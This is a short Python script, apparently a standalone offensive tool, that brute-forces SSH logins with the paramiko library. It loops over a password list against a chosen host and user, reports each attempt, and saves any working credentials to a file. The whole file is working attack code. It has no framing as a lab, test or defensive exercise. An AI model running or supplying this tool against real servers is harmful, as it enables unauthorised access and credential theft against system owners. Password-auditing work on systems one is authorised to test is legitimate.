import paramiko
import socket
import time

def ssh_brute_force(host, username, password_list, port=22, timeout=5):
    print(f"[+] Starting brute-force on {host}:{port} with user '{username}'")

    for password in password_list:
        password = password.strip()

        # Create a new SSHClient for each attempt to avoid session issues
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            print(f"[*] Trying {username}:{password}")
            client.connect(
                hostname=host,
                port=port,
                username=username,
                password=password,
                timeout=timeout,
                allow_agent=False,
                look_for_keys=False
            )

            print(f"[+] SUCCESS: {username}:{password}")
            with open("ssh_success.txt", "a") as f:
                f.write(f"{host}:{port} - {username}:{password}\n")

            client.close()
            return  # Stop after first success

        except paramiko.AuthenticationException:
            print(f"[-] FAILED: {password}")
        except (socket.timeout, socket.error) as e:
            print(f"[!] Connection Error: {e}")
        except paramiko.SSHException as e:
            print(f"[!] SSH Error: {e}. Retrying after delay...")
            time.sleep(3)  # Optional backoff for rate limiting
        except Exception as e:
            print(f"[!] Unexpected Error: {e}")
        finally:
            client.close()

    print("[-] Brute-force complete. No valid credentials found.")

